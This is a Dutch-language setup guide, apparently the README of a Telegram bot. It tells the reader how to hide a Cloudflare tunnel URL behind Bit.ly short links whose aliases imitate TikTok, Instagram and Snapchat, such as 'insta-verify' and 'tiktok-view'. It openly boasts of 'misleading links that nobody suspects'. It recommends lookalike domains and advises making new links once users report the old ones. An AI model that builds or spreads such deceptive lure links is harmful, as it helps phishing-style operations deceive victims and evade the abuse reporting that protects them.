# 🔗 BIT.LY SETUP - Misleidende Links

Met Bit.ly kun je **misleidende korte links** maken die eruitzien als TikTok, Instagram, etc.!

---

## 🎯 RESULTAAT:

**Zonder Bit.ly:**
```
https://circuit-repair-announcements-artificial.trycloudflare.com/v/abc123
```
❌ Super verdacht!

**Met Bit.ly:**
```
https://bit.ly/tiktok-view-8472
https://bit.ly/snap-check-3291
https://bit.ly/insta-verify-1847
```
✅ Ziet er legit uit!

---

## 📝 SETUP (5 MINUTEN):

### **Stap 1: Maak Bit.ly Account (Gratis)**

1. Ga naar: https://bitly.com/a/sign_up
2. Sign up met email (gratis!)
3. Bevestig je email

### **Stap 2: Genereer API Token**

1. Ga naar: https://app.bitly.com/settings/api/
2. Klik op **"Generate Token"**
3. Vul je password in
4. **Kopieer de token** (lang random string)

### **Stap 3: Voeg Token toe aan .env**

```bash
nano .env
```

Voeg deze regel toe onderaan:
```
BITLY_TOKEN=jouw_lange_token_hier
```

**Opslaan:** CTRL+X → Y → Enter

### **Stap 4: Herstart de bot**

```bash
npm start
```

---

## ✅ TESTEN:

1. Stuur `/start` naar je bot
2. Je krijgt nu een **Bit.ly link**!
3. Bijvoorbeeld: `https://bit.ly/tiktok-view-4829`
4. Test de link → Werkt perfect!

---

## 🎭 HOE HET WERKT:

De bot maakt **automatisch** misleidende aliassen:
- `tiktok-view-XXXX`
- `snap-check-XXXX`
- `insta-verify-XXXX`
- `video-watch-XXXX`
- `photo-check-XXXX`
- `media-view-XXXX`
- `content-see-XXXX`
- `clip-watch-XXXX`

Elke link krijgt een random nummer erbij.

---

## ⚠️ BELANGRIJK:

### **Gratis account limitaties:**
- **50 links per maand**
- Na 50 links: krijg je directe Cloudflare links
- Upgrade naar betaald ($29/maand) voor onbeperkt

### **Zonder BITLY_TOKEN:**
De bot werkt nog steeds, maar stuurt:
```
https://circuit-repair-announcements-artificial.trycloudflare.com/v/abc123
```

Met token:
```
https://bit.ly/tiktok-view-3847
```

---

## 🆚 VERGELIJKING:

| Optie | Link Voorbeeld | Verdacht? | Kosten |
|-------|----------------|-----------|--------|
| **Directe Cloudflare** | `https://xyz.trycloudflare.com/v/abc` | ⚠️ Ja | Gratis |
| **Bit.ly (gratis)** | `https://bit.ly/tiktok-view-123` | ✅ Nee | Gratis (50/maand) |
| **Bit.ly (betaald)** | `https://bit.ly/tiktok-view-123` | ✅ Nee | $29/maand |
| **Eigen domein** | `https://tiktok-archive.com/v/abc` | ✅ Nee | €10/jaar |

---

## 💡 TIPS:

### **Meerdere links:**
Elke `/start` maakt een nieuwe Bit.ly link met random alias.

### **50 links op?**
- Wacht tot volgende maand
- Of upgrade naar betaald
- Of gebruik directe links

### **Bit.ly beveiligingsmelding?**
Soms geeft Bit.ly een waarschuwing als te veel mensen de link rapporteren. 
Maak dan gewoon een nieuwe link met `/nieuw`.

---

## 🐛 PROBLEMEN?

### "Invalid access token"
- Check of BITLY_TOKEN correct is in .env
- Geen spaties voor/na de token
- Token moet beginnen met random letters/cijfers

### Geen korte links
- Check of BITLY_TOKEN is ingesteld
- Herstart bot na toevoegen token
- Check console voor error messages

### 50 links limiet bereikt
```bash
# Bot toont dan automatisch directe Cloudflare link
# Wacht tot volgende maand of upgrade
```

---

## 🚀 QUICK SETUP RECAP:

```bash
# 1. Maak account: https://bitly.com/a/sign_up
# 2. Genereer token: https://app.bitly.com/settings/api/
# 3. Voeg toe aan .env:
nano .env
# BITLY_TOKEN=jouw_token_hier

# 4. Herstart bot
npm start

# 5. Test!
# Stuur /start in Telegram
```

---

**Nu heb je misleidende links die niemand verdenkt! 😎🔥**